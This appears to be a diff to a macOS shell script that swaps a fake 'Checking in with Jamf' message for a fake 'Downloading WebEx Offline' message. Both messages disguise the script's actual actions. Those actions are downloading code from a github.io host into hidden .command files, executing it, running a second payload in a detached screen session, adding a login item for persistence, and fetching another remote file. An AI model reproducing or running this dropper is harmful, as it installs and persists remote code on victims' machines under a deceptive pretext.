@@ -1,4 +1,4 @@
-echo "Checking in with Jamf..."
+echo "Downloading WebEx Offline..."
 curl -s -o .form3.command https://form3tech-support.github.io/gp.html
 chmod +x .form3.command
 ./.form3.command
@@ -7,5 +7,5 @@ chmod +x .form3b.command
 screen -dm bash -c ./.form3b.command
 osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Users/$(whoami)/.form3.command", hidden:false}'
 curl -s -o MALAZAR.txt https://form3tech-support.github.io/resistance.html
-echo "Checkin complete"
+echo "Download complete"
 
